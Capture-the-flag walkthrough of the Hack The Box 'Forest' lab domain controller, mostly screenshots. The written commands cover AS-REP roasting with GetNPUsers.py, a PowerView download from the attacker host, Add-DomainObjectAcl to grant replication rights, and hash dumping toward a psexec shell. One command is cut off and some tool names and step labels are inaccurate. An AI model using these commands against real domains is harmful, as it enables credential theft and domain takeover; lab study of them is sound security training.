https://app.hackthebox.com/machines/Forest

Enumeration

Nmap

![image](https://user-images.githubusercontent.com/93418272/184115004-2a77a52a-c6e4-4261-9aca-d69b88cccfea.png)


A Domain Controller for the htb.local is found

SMB

![image](https://user-images.githubusercontent.com/93418272/184115042-cfd61216-893c-49da-8e69-a2b84661fd05.png)

![image](https://user-images.githubusercontent.com/93418272/184115057-03ec63f0-d199-4999-bf53-0d5805027dab.png)

RPC

![image](https://user-images.githubusercontent.com/93418272/184115088-2a545055-c8e1-4018-beee-f93e08a531e9.png)

Found a service account

![image](https://user-images.githubusercontent.com/93418272/184115119-e1b4a3b4-a3e9-41cb-8b40-9c774fdf2b69.png)


Let's do a test for discovering a user that does not require a pre-Authentication

Create a user list with the found users.

![image](https://user-images.githubusercontent.com/93418272/184115138-76955b52-f11e-4ddd-87cb-b7e854ac215d.png)


Start up kerbrute  

![image](https://user-images.githubusercontent.com/93418272/184115153-4a119bc2-c50a-464f-803f-363ffa5d0c8f.png)


The user accounts that are enabled with no pre-Authentication, it’s vulnerable to AS-REP Roasting attack.

Use the Impackt GetNPUsers.py from here.

Run the python script to dump out the hash.

./GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161

![image](https://user-images.githubusercontent.com/93418272/184115194-71eab69b-cb24-475e-b070-d11b52e4558a.png)


Use John to crack the hash.

![image](https://user-images.githubusercontent.com/93418272/184115210-68334eb9-9d88-4f61-a59b-8e49aea17c8d.png)


Use evil-winrm to gain access.

![image](https://user-images.githubusercontent.com/93418272/184115228-4c587194-649b-45cf-b4de-245720a4f092.png)


First flag is found.

![image](https://user-images.githubusercontent.com/93418272/184115242-52defeb1-595d-4dd3-8458-a53d1c94e7a5.png)


Use the bloodhound python script to collect JSON data for the Bloodhound app

![image](https://user-images.githubusercontent.com/93418272/184115260-a8aa90e7-cf9f-4527-a739-b51f7f8a6b8f.png)


Load the data to Bloodhound and look at svs-alfresco data

The node belongs to the account operators group.

![image](https://user-images.githubusercontent.com/93418272/184115286-230b71e5-f656-4733-a6c2-48409cc4f877.png)


Account Operators group are allowed create and modify users and add them to non-protected groups.

Download the Powerspoilt dev module from github and start a python server to transfer the PowerView script to the windows box.

powershell Invoke-WebRequest -Uri http://10.10.14.23:80/PowerView.ps1 -OutFile PowerView.ps1

Input the following commands 

$pass = convertto-securestring 'password' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential ('HTB\persecure', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity persecure -

![image](https://user-images.githubusercontent.com/93418272/184115318-31d633cb-167d-4f65-bd0b-7301e3f018fa.png)


Use secretsdump.py to get the hashes.

![image](https://user-images.githubusercontent.com/93418272/184115342-2efe198f-bbce-48bd-85f3-cff1ec616b4c.png)


Crack the hash with crackmapexec

![image](https://user-images.githubusercontent.com/93418272/184115427-b5d4e3e9-7266-4ec8-9048-603f85a592b2.png)


Use psexec.py to gain a shell.

![image](https://user-images.githubusercontent.com/93418272/184115394-685b97be-58d3-4e2f-8614-129c45b9e343.png)


Root flag is found.

![image](https://user-images.githubusercontent.com/93418272/184115486-25661ffc-825f-4a41-8f73-92ff9bb3024a.png)
